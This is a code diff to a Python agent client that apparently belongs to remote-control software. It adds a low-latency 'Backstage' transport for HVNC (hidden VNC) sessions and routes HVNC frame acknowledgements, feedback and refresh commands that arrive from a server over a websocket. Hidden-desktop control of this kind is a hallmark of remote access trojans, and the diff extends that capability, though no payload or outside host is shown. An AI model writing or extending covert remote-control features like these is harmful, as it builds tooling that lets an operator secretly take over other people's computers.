@@ -450,6 +450,18 @@ class AgentClient:
 
                                 if mtype == "start_hvnc":
                                     logger.info("Received request to start HVNC session (Backstage).")
+                                    from agent_client.mirror_transport import BackstageUplink
+                                    protocol = msg.get("transport", 2)
+                                    preview = bool(msg.get("preview", True))
+                                    if (self.is_streaming and self.hvnc_stream_task and not self.hvnc_stream_task.done()
+                                            and protocol == getattr(self, "hvnc_protocol", 0)):
+                                        if protocol == 2 and hasattr(self, "hvnc_flow") and self.hvnc_flow:
+                                            self.hvnc_flow.preview = preview
+                                            self.hvnc_flow.refresh()
+                                        continue
+                                    self.hvnc_protocol = protocol
+                                    if protocol == 2:
+                                        self.hvnc_flow = BackstageUplink(self, ws, preview)
                                     self.is_streaming = True
                                     if self.input_handler:
                                         self.input_handler.reset_state()
@@ -485,15 +497,21 @@ class AgentClient:
                                         self.mirror_stream_task.cancel()
                                     self.mirror_stream_task = asyncio.create_task(self._mirror_stream_loop(ws))
 
-                                elif mtype == "mirror_frame_ack":
-                                    if getattr(self, "mirror_protocol", 0) == 2:
+                                elif mtype in ("mirror_frame_ack", "hvnc_frame_ack"):
+                                    if getattr(self, "mirror_protocol", 0) == 2 and hasattr(self, "mirror_flow") and self.mirror_flow:
                                         self.mirror_flow.acknowledge(msg)
-                                elif mtype == "mirror_feedback":
-                                    if getattr(self, "mirror_protocol", 0) == 2:
+                                    if getattr(self, "hvnc_protocol", 0) == 2 and hasattr(self, "hvnc_flow") and self.hvnc_flow:
+                                        self.hvnc_flow.acknowledge(msg)
+                                elif mtype in ("mirror_feedback", "hvnc_feedback"):
+                                    if getattr(self, "mirror_protocol", 0) == 2 and hasattr(self, "mirror_flow") and self.mirror_flow:
                                         self.mirror_flow.feedback(msg.get("delivery_ms"))
-                                elif mtype == "mirror_refresh":
-                                    if getattr(self, "mirror_protocol", 0) == 2:
+                                    if getattr(self, "hvnc_protocol", 0) == 2 and hasattr(self, "hvnc_flow") and self.hvnc_flow:
+                                        self.hvnc_flow.feedback(msg.get("delivery_ms"))
+                                elif mtype in ("mirror_refresh", "hvnc_refresh"):
+                                    if getattr(self, "mirror_protocol", 0) == 2 and hasattr(self, "mirror_flow") and self.mirror_flow:
                                         self.mirror_flow.refresh()
+                                    if getattr(self, "hvnc_protocol", 0) == 2 and hasattr(self, "hvnc_flow") and self.hvnc_flow:
+                                        self.hvnc_flow.refresh()
                                 elif mtype == "stop_mirror":
                                     logger.info("Stopping Screen Mirror session.")
                                     self.is_mirroring = False
@@ -898,6 +916,13 @@ class AgentClient:
                 break
 
     async def _stream_loop(self, ws):
+        if getattr(self, "hvnc_protocol", 0) == 2 and hasattr(self, "hvnc_flow") and self.hvnc_flow:
+            try:
+                await self.hvnc_flow.run()
+                return
+            except Exception as ex:
+                logger.error(f"Low-latency Backstage flow error: {ex}. Falling back to standard streaming loop...")
+
         loop = asyncio.get_event_loop()
         consecutive_errors = 0
         last_sent_bytes = None
